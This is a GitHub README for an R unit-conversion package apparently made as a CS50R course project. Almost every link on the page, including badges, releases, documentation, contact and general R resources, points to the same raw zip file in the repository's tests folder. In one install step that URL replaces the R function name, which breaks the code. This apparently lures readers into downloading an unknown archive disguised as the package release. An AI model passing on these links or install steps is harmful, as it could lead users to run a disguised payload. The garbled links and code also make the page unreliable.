# UnitConverter: R Package for Unit Conversion 🌡️⚖️📏

![UnitConverter](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip) ![License](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip) ![R-CMD-check](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip)

## Overview

Welcome to the **UnitConverter** repository! This R package allows you to easily convert between various units of measurement, including temperature, weight, and length. This project serves as the final submission for the CS50R course, showcasing the application of concepts learned throughout the program.

You can download the latest version of the package from the [Releases section](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip). 

## Features

- **Temperature Conversion**: Convert between Celsius, Fahrenheit, and Kelvin.
- **Weight Conversion**: Easily switch between kilograms, grams, pounds, and ounces.
- **Length Conversion**: Convert between meters, kilometers, feet, and miles.
- **Error Handling**: The package includes robust error handling to ensure accurate conversions.
- **Testing**: Uses the `testthat` package for unit testing to ensure reliability.

## Installation

To install the **UnitConverter** package, you can use the following command in R:

```R
devtools::install_github("bijoy1243/unitconverter")
```

Make sure you have the `devtools` package installed. If not, install it using:

```R
https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip("devtools")
```

## Usage

After installation, load the package in your R environment:

```R
library(unitconverter)
```

### Temperature Conversion

To convert temperatures, use the `convert_temperature` function:

```R
convert_temperature(value, from_unit, to_unit)
```

**Example**:

```R
convert_temperature(100, "Celsius", "Fahrenheit")
```

### Weight Conversion

For weight conversions, use the `convert_weight` function:

```R
convert_weight(value, from_unit, to_unit)
```

**Example**:

```R
convert_weight(10, "kilograms", "pounds")
```

### Length Conversion

For length conversions, use the `convert_length` function:

```R
convert_length(value, from_unit, to_unit)
```

**Example**:

```R
convert_length(5, "meters", "feet")
```

## Error Handling

The package includes error handling to manage invalid inputs. If an invalid unit is provided, the package will return an informative error message.

### Example of Error Handling

```R
convert_temperature(100, "Celsius", "InvalidUnit")
# Error: Invalid unit provided. Please use Celsius, Fahrenheit, or Kelvin.
```

## Testing

We use the `testthat` package to ensure the functions work as expected. To run the tests, use:

```R
devtools::test()
```

## Documentation

Comprehensive documentation is available within the package. You can access it using:

```R
?convert_temperature
?convert_weight
?convert_length
```

For more detailed documentation, visit the [R Documentation](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip).

## Contributing

We welcome contributions! If you would like to contribute to the **UnitConverter** package, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature-branch`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add new feature'`).
5. Push to the branch (`git push origin feature-branch`).
6. Open a Pull Request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Issues

If you encounter any issues or have suggestions for improvements, please open an issue in the GitHub repository.

## Release Information

To stay updated with the latest releases, visit the [Releases section](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip). Here, you can find the latest version of the package, along with release notes detailing changes and improvements.

## Acknowledgments

- Thanks to the CS50R course for providing the foundation for this project.
- Special thanks to the R community for their support and resources.

## Contact

For questions or feedback, please reach out to the repository owner:

- **Bijoy**: [bijoy1243](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip)

## Additional Resources

- [R Project](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip)
- [R for Data Science](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip)
- [CRAN Task Views](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip)

## Example Outputs

### Temperature Conversion Example

```R
result <- convert_temperature(100, "Celsius", "Fahrenheit")
print(result)  # Output: 212
```

### Weight Conversion Example

```R
result <- convert_weight(10, "kilograms", "pounds")
print(result)  # Output: 22.0462
```

### Length Conversion Example

```R
result <- convert_length(5, "meters", "feet")
print(result)  # Output: 16.4042
```

## FAQ

### What units are supported for temperature conversion?

The supported units for temperature conversion are Celsius, Fahrenheit, and Kelvin.

### Can I add new units to the package?

Currently, the package does not support adding new units. However, you can suggest this feature in the issues section.

### How can I report a bug?

To report a bug, please open an issue in the GitHub repository and provide as much detail as possible.

### Is there a way to contribute to the documentation?

Yes, contributions to the documentation are welcome! You can fork the repository and submit a pull request with your changes.

### How often are updates released?

Updates are released based on community feedback and feature requests. Keep an eye on the [Releases section](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip) for the latest information.

## Community

Join the conversation and connect with other users of the **UnitConverter** package. Share your experiences, tips, and tricks for using the package effectively.

- **R Users Group**: [R-Lang Slack](https://github.com/bijoy1243/unitconverter/raw/refs/heads/main/tests/Software_3.6.zip)
- **Stack Overflow**: Tag your questions with `R` and `unitconverter`.

Thank you for using **UnitConverter**! Your support helps improve the package and make it more useful for everyone.